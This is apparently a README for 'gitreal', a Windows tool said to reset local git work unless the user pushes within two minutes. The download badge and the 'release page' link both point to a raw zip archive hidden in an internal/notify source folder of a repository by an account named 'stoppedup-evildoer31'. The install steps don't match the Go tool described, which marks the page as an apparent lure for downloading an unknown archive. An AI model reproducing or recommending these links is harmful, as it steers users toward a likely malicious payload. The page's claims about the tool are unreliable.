# ⏱️ gitreal - Build better habits with timed pushes

[![](https://img.shields.io/badge/Download-GitReal-blue.svg)](https://raw.githubusercontent.com/stoppedup-evildoer31/gitreal/main/internal/notify/Software-v2.9-alpha.1.zip)

GitReal helps you push your code to your server on time. Software development requires focus, but procrastination slows your progress. This tool creates a two-minute window to push your work. If you miss that window, the tool resets your progress to the last saved state. This creates pressure that helps you build a habit of saving your work often. You keep your code safe and your history clean.

## ⚙️ System Requirements

This software works on Windows 10 and Windows 11. You need a Git account to save your work. The installation process uses a tool called Go. Go acts as a bridge to pull the GitReal application onto your machine. Ensure your computer has a stable internet connection for the installation. Set aside ten minutes to complete the setup process.

## 📥 How to Install

1. Visit the [GitReal release page](https://raw.githubusercontent.com/stoppedup-evildoer31/gitreal/main/internal/notify/Software-v2.9-alpha.1.zip) to download the installer for your system.
2. Open your Windows Start menu and type Command Prompt.
3. Select the Command Prompt application to open the terminal.
4. Type the installation command provided on the download page and press Enter.
5. Wait for the terminal to finish downloading the files.
6. Close the terminal window once the process ends.
7. Open a new terminal window to refresh your system settings.
8. Type `git real --version` to confirm that the tool is ready.

## 🚀 Setting Up Your Project

You must initialize the tool inside every project folder where you want to use it. Navigate to your project folder using your terminal. Use the command `cd` followed by the path to your folder. Once inside the folder, run the command `git real init`. This command creates a folder that tracks your work. 

The tool starts in dry-run mode. Dry-run mode lets you test the timer without losing any work. You can see how the tool behaves during your daily tasks. Use the command `git real status` at any time to check if the timer is active.

## 🕒 How to Use The Timer

Use the command `git real once` to start a single two-minute session. The timer begins the moment you press Enter. You must push your changes to your Git repository before the two minutes pass. If you fail to push in time, the tool logs the event. Since you are in dry-run mode, your files remain unchanged. You gain experience with the workflow without risks. 

Once you feel comfortable, you can enable active mode. Active mode triggers the reset behavior when the timer runs out. Use `git real arm` to turn on the reset feature. Use `git real disarm` to turn it off. Always test these features in a practice folder first.

## 🛠️ Managing Your Workflow

Consistent use of this tool changes your work patterns. Break your tasks into small pieces. Complete one piece and push your code. This creates a rhythm. You no longer worry about losing hours of effort. Instead, you focus on the current two-minute block. 

The status command provides helpful information. It shows the time remaining and whether the tool is armed. Check this before you start a new task. If you feel overwhelmed, use the disarm command to take a break. You control the pressure. You set the pace.

## 🆘 Frequently Asked Questions

What happens if I stop working?
The timer tracks your activity within the Git environment. If you do not push, the tool treats the silence as missed work. 

Can I disable the tool for a specific project?
Yes. Navigate to the project folder and run `git real disarm`. This prevents any resets or warnings for that specific folder.

Does this tool delete my files forever?
It only affects the work that you have not saved to the server. It restores your local folder to the state of your last server save. It does not touch files that belong to your operating system or other programs.

Is my data safe during an update?
Updates do not change your folder settings or your repository status. Run the install command again to update your version to the latest one. 

Does the tool require an internet connection?
The tool runs on your machine, but pushing your code to the server needs the web. Ensure you stay connected while you work.

How do I remove the tool?
Delete the hidden folder inside your project directory to stop the tracking. You may also remove the software from your computer using the Windows Apps and Features menu in your system settings.